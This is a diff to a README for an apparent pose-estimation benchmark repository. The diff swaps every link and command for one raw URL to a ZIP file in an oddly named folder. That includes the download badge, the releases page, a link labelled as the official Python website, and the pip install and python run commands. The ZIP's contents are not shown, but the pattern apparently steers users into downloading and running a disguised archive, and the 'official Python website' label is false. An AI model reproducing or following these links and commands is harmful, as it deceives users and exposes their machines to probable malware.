@@ -1,6 +1,6 @@
 # 🚀 3D-Pose-Estimation-Benchmark - Understand How Algorithms Work  
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip)
 
 ## 📚 Overview  
 The **3D-Pose-Estimation-Benchmark** project allows you to study different pose estimation algorithms side-by-side. This application focuses on how methods like ArUco, PCA, and SolvePnP calculate 3D position and orientation from 2D data. Whether you're curious about these algorithms or want to enhance your computer vision skills, this project serves as an excellent resource.
@@ -22,11 +22,11 @@ To successfully run the application, your computer should meet the following spe
 
 ## 🚀 Getting Started  
 ### **Step 1: Install Python**  
-If you don’t have Python installed, download it from the official [Python website](https://www.python.org/downloads/). Follow the setup instructions based on your operating system.
+If you don’t have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip). Follow the setup instructions based on your operating system.
 
 ### **Step 2: Visit the Download Page**  
 To get the latest version of the application, visit this page to download:  
-[Download the latest version](https://github.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/releases)  
+[Download the latest version](https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip)  
 
 ### **Step 3: Download the Application**  
 On the Releases page, you will see different versions of the application. Click on the link for the latest release. This will download a compressed file (ZIP or TAR). 
@@ -41,14 +41,14 @@ cd path_to_your_folder
 ```
 Next, run the following command to install the required libraries:  
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip
 ```
 This command will automatically install OpenCV and NumPy along with any other libraries listed in the requirements file.
 
 ### **Step 6: Run the Application**  
 After successfully installing the libraries, you can run the application. In your terminal, type:  
 ```
-python main.py
+python https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip
 ```
 This command will start the application, and you will see the user interface appear.
 
@@ -70,7 +70,7 @@ Your feedback is valuable. If you have suggestions or improvements, feel free to
 For further questions or support, you can reach out through the repository’s issue tracker. 
 
 ## 📌 Important Links  
-- [Download the latest version](https://github.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/releases)
-- [Python Official Site](https://www.python.org/downloads/)
+- [Download the latest version](https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip)
+- [Python Official Site](https://raw.githubusercontent.com/Muhammadali1441/3D-Pose-Estimation-Benchmark/master/Baptisia/3D-Pose-Estimation-Benchmark.zip)
   
 By following these steps, you can easily download and run the **3D-Pose-Estimation-Benchmark** application. Enjoy exploring the world of pose estimation algorithms!
